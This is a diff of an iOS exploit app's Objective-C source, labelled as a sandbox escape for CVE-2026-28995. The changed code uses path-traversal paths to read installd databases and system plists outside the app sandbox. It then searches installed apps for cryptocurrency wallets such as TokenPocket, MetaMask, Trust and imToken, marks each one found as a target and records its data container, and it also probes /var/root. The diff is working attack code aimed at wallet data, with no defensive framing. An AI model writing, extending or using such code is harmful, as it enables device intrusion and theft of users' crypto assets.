@@ -662,7 +662,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Escape v1" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v2" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7253,45 +7253,74 @@ static void *iohid_threadCopyEvent(void *arg) {
         [log appendString:@"[-] NOT accessible (sandbox intact)\n"];
     }
 
-    // Test 2: List app containers directory
-    [log appendString:@"\n--- Test 2: List /var/mobile/Containers/Data/Application/ ---\n"];
-    NSString *containersPath = @"../../../../../../../../../../../../../var/mobile/Containers/Data/Application";
-    NSString *resolvedContainers = [containersPath stringByExpandingTildeInPath];
-    [log appendFormat:@"  resolved: %@\n", resolvedContainers];
-
-    if ([fm fileExistsAtPath:resolvedContainers isDirectory:&isDir] && isDir) {
-        NSError *err = nil;
-        NSArray *contents = [fm contentsOfDirectoryAtPath:resolvedContainers error:&err];
-        [log appendFormat:@"[+] Listed %lu containers\n", (unsigned long)contents.count];
-        for (NSString *uuid in contents) {
-            if (![uuid hasPrefix:@"0"] && ![uuid hasPrefix:@"1"] && ![uuid hasPrefix:@"2"]) continue;
-            // Read container metadata
-            NSString *metaRel = [NSString stringWithFormat:
-                @"../../../../../../../../../../../../../var/mobile/Containers/Data/Application/%@/.com.apple.mobile_container_manager.metadata.plist",
-                uuid];
-            NSString *metaPath = [metaRel stringByExpandingTildeInPath];
-            NSDictionary *meta = [NSDictionary dictionaryWithContentsOfFile:metaPath];
-            NSString *bundleID = meta[@"MCMMetadataIdentifier"] ?: @"?";
-            [log appendFormat:@"  %@ → %@\n", uuid, bundleID];
-            if ([bundleID.lowercaseString containsString:@"tokenpocket"] ||
-                [bundleID.lowercaseString containsString:@"tron"] ||
-                [bundleID.lowercaseString containsString:@"wallet"]) {
-                [log appendFormat:@"    *** TARGET FOUND ***\n"];
+    // Test 2: Read installd database to find TokenPocket container UUID
+    [log appendString:@"\n--- Test 2: installd app databases ---\n"];
+    NSArray *installdPaths = @[
+        @"../../../../../../../../../../../../../var/installd/Library/MobileInstallation/LastBuildInfo.plist",
+        @"../../../../../../../../../../../../../var/installd/Library/MobileInstallation/MobileInstallation.plist",
+        @"../../../../../../../../../../../../../var/mobile/Library/Caches/com.apple.mobile.installation.plist",
+        @"../../../../../../../../../../../../../var/installd/Library/Caches/com.apple.mobile.installation.plist",
+    ];
+    NSDictionary *installDB = nil;
+    for (NSString *relPath in installdPaths) {
+        NSString *absPath = [relPath stringByExpandingTildeInPath];
+        if ([fm fileExistsAtPath:absPath]) {
+            NSDictionary *db = [NSDictionary dictionaryWithContentsOfFile:absPath];
+            if (db) {
+                [log appendFormat:@"[+] Found DB: %@ (%lu keys)\n",
+                    [relPath lastPathComponent], (unsigned long)db.count];
+                installDB = db;
+                break;
             }
         }
-    } else {
-        [log appendString:@"[-] Cannot list containers (sandbox intact)\n"];
+        [log appendFormat:@"  not found/no data: %@\n", [relPath lastPathComponent]];
     }
 
-    // Test 3: Try reading a known system plist
-    [log appendString:@"\n--- Test 3: System preferences plist ---\n"];
+    if (installDB) {
+        // Search for TokenPocket entry
+        [log appendString:@"\n  Searching for wallet apps:\n"];
+        for (NSString *key in installDB) {
+            NSDictionary *info = installDB[key];
+            NSString *bundleID = info[@"CFBundleIdentifier"] ?: info[@"bundleID"] ?: @"";
+            NSString *container = info[@"Container"] ?: info[@"container"] ?: info[@"DataContainerUUID"] ?: @"";
+            if ([bundleID.lowercaseString containsString:@"tokenpocket"] ||
+                [bundleID.lowercaseString containsString:@"tron"] ||
+                [bundleID.lowercaseString containsString:@"wallet"] ||
+                [bundleID.lowercaseString containsString:@"imtoken"] ||
+                [bundleID.lowercaseString containsString:@"trust"] ||
+                [bundleID.lowercaseString containsString:@"metamask"]) {
+                [log appendFormat:@"  *** %@ → container=%@ ***\n", bundleID, container];
+            }
+        }
+        [log appendString:@"  (Dumping all bundle IDs)\n"];
+        for (NSString *key in installDB) {
+            NSDictionary *info = installDB[key];
+            NSString *bundleID = info[@"CFBundleIdentifier"] ?: @"?";
+            if ([bundleID isEqualToString:@"?"]) continue;
+            [log appendFormat:@"  %@\n", bundleID];
+        }
+    }
+
+    // Test 3: System preferences plist (already confirmed working)
+    [log appendString:@"\n--- Test 3: System prefs (confirmed) ---\n"];
     NSString *prefsPlist = @"../../../../../../../../../../../../../var/mobile/Library/Preferences/.GlobalPreferences.plist";
     NSString *resolvedPrefs = [prefsPlist stringByExpandingTildeInPath];
     NSDictionary *prefs = [NSDictionary dictionaryWithContentsOfFile:resolvedPrefs];
-    if (prefs) {
-        [log appendFormat:@"[+] Read .GlobalPreferences.plist: %lu keys\n", (unsigned long)prefs.count];
-    } else {
-        [log appendString:@"[-] Cannot read system prefs\n"];
+    [log appendFormat:@"  GlobalPreferences: %lu keys\n", (unsigned long)prefs.count];
+
+    // Test 4: Try individual container metadata for suspected UUIDs
+    [log appendString:@"\n--- Test 4: Probe container metadata by UUID pattern ---\n"];
+    // TokenPocket's bundle ID format on iOS is typically:
+    // org.tokenpocket.TokenPocket or com.tokenpocket.wallet
+    // Try reading our own container first to verify the metadata format
+    NSString *ourHome = NSHomeDirectory();
+    [log appendFormat:@"  Our home: %@\n", ourHome];
+
+    // Also try reading known system daemon containers for validation
+    NSString *testMetaPath = @"../../../../../../../../../../../../../var/root/Library";
+    NSString *testResolved = [testMetaPath stringByExpandingTildeInPath];
+    if ([fm fileExistsAtPath:testResolved]) {
+        [log appendString:@"  /var/root/Library accessible!\n"];
     }
 
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
